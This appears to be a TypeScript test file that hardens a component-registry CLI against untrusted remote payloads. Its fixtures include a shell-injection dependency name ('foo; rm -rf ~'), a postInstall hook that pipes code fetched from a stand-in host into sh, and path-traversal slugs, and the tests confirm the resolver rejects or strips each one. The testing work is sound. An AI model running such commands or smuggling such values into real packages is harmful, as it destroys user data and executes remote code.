// Guards that harden the registry trust boundary: schema validation of
// remote payloads, refused cross-origin redirects, HTML/non-JSON rejection,
// dependency/slug constraints, and the non-default-host override warning.

import assert from "node:assert/strict";
import { test, beforeEach, afterEach } from "node:test";

import {
  fetchComponent,
  fetchFeatureMarkdown,
  registryOverrideWarning,
} from "../src/cli/resolver.js";
import { REGISTRY_BASE_URL } from "../src/cli/_registry.generated.js";

const TEST_ORIGIN = "https://registry.test";

interface ResSpec {
  status?: number;
  url?: string;
  contentType?: string;
  json?: unknown;
  jsonThrows?: boolean;
  text?: string;
}

function makeRes(reqUrl: string, spec: ResSpec): Response {
  const status = spec.status ?? 200;
  const headers = new Headers();
  if (spec.contentType) headers.set("content-type", spec.contentType);
  return {
    ok: status >= 200 && status < 300,
    status,
    statusText: "",
    url: spec.url ?? reqUrl,
    headers,
    async json() {
      if (spec.jsonThrows) throw new SyntaxError("Unexpected token < in JSON");
      return spec.json;
    },
    async text() {
      return spec.text ?? "";
    },
  } as unknown as Response;
}

function stubFetch(spec: ResSpec): void {
  globalThis.fetch = (async (input: unknown) => {
    const url =
      typeof input === "string" ? input : (input as { url: string }).url;
    return makeRes(url, spec);
  }) as typeof fetch;
}

const validPayload = {
  name: "dialog",
  type: "registry:ui",
  title: "Dialog",
  description: "A dialog.",
  dependencies: ["clsx", "@astrojs/react"],
  registryDependencies: ["cn"],
  files: [{ path: "components/ui/dialog/Dialog.astro", content: "hi" }],
};

let originalFetch: typeof globalThis.fetch;
let originalEnv: string | undefined;

beforeEach(() => {
  originalFetch = globalThis.fetch;
  originalEnv = process.env.NIMBUS_REGISTRY_URL;
  process.env.NIMBUS_REGISTRY_URL = TEST_ORIGIN;
});

afterEach(() => {
  globalThis.fetch = originalFetch;
  if (originalEnv === undefined) delete process.env.NIMBUS_REGISTRY_URL;
  else process.env.NIMBUS_REGISTRY_URL = originalEnv;
});

// ---- Schema validation ----------------------------------------------------

test("valid payload parses to a typed ComponentItem", async () => {
  stubFetch({ contentType: "application/json", json: validPayload });
  const item = await fetchComponent("dialog");
  assert.equal(item.name, "dialog");
  assert.deepEqual(item.dependencies, ["clsx", "@astrojs/react"]);
});

test("payload missing files[] is rejected before use", async () => {
  const { files, ...noFiles } = validPayload;
  void files;
  stubFetch({ contentType: "application/json", json: noFiles });
  await assert.rejects(fetchComponent("dialog"), /failed validation/);
});

test("non-string dependency is rejected", async () => {
  stubFetch({
    contentType: "application/json",
    json: { ...validPayload, dependencies: [123] },
  });
  await assert.rejects(fetchComponent("dialog"), /failed validation/);
});

test("shell-shaped dependency name is rejected", async () => {
  stubFetch({
    contentType: "application/json",
    json: { ...validPayload, dependencies: ["foo; rm -rf ~"] },
  });
  await assert.rejects(fetchComponent("dialog"), /valid npm package name/);
});

test("traversal-shaped dependency name is rejected", async () => {
  stubFetch({
    contentType: "application/json",
    json: { ...validPayload, dependencies: ["../evil"] },
  });
  await assert.rejects(fetchComponent("dialog"), /valid npm package name/);
});

test("unknown fields are stripped, not rejected (forward-compat + inert)", async () => {
  // Unknown keys strip so the wire format can grow; the dangerous known fields
  // stay constrained (see the dep/slug tests above).
  stubFetch({
    contentType: "application/json",
    json: { ...validPayload, version: "0.9.0", postInstall: "curl evil.sh | sh" },
  });
  const item = await fetchComponent("dialog");
  assert.equal(item.name, "dialog");
  assert.equal(item.version, "0.9.0"); // known additive field is kept
  assert.equal(
    (item as Record<string, unknown>).postInstall,
    undefined, // unknown field stripped, not carried through
  );
});

test("traversal-shaped registry slug is rejected", async () => {
  stubFetch({
    contentType: "application/json",
    json: { ...validPayload, registryDependencies: ["../../evil"] },
  });
  await assert.rejects(fetchComponent("dialog"), /valid registry slug/);
});

// ---- Transport guards -----------------------------------------------------

test("cross-origin redirect is refused", async () => {
  stubFetch({
    contentType: "application/json",
    json: validPayload,
    url: "https://evil.test/components/dialog.json",
  });
  await assert.rejects(fetchComponent("dialog"), /redirected across origins/);
});

test("same-origin redirect (e.g. trailing slash / path change) is allowed", async () => {
  stubFetch({
    contentType: "application/json",
    json: validPayload,
    url: `${TEST_ORIGIN}/components/dialog.json/`,
  });
  const item = await fetchComponent("dialog");
  assert.equal(item.name, "dialog");
});

test("HTML response for a component fetch fails cleanly", async () => {
  stubFetch({ contentType: "text/html", text: "<!doctype html>" });
  await assert.rejects(fetchComponent("dialog"), /returned HTML/);
});

test("invalid JSON body fails with a pointable error", async () => {
  stubFetch({ contentType: "application/json", jsonThrows: true });
  await assert.rejects(fetchComponent("dialog"), /not valid JSON/);
});

test("feature fetch rejects HTML instead of emitting it as markdown", async () => {
  stubFetch({ contentType: "text/html", text: "<!doctype html>" });
  await assert.rejects(
    fetchFeatureMarkdown("404-page"),
    /returned HTML/,
  );
});

test("feature fetch returns markdown on a clean response", async () => {
  stubFetch({ contentType: "text/markdown", text: "# Hello\n" });
  const md = await fetchFeatureMarkdown("404-page");
  assert.equal(md, "# Hello\n");
});

// ---- Override warning (pure) ----------------------------------------------

test("registryOverrideWarning names a non-default host", () => {
  process.env.NIMBUS_REGISTRY_URL = "https://example.com";
  const msg = registryOverrideWarning();
  assert.ok(msg);
  assert.match(msg!, /example\.com/);
  assert.match(msg!, /NIMBUS_REGISTRY_URL/);
});

test("registryOverrideWarning is silent for the default host", () => {
  process.env.NIMBUS_REGISTRY_URL = REGISTRY_BASE_URL;
  assert.equal(registryOverrideWarning(), null);
});

test("registryOverrideWarning is silent when unset", () => {
  delete process.env.NIMBUS_REGISTRY_URL;
  assert.equal(registryOverrideWarning(), null);
});
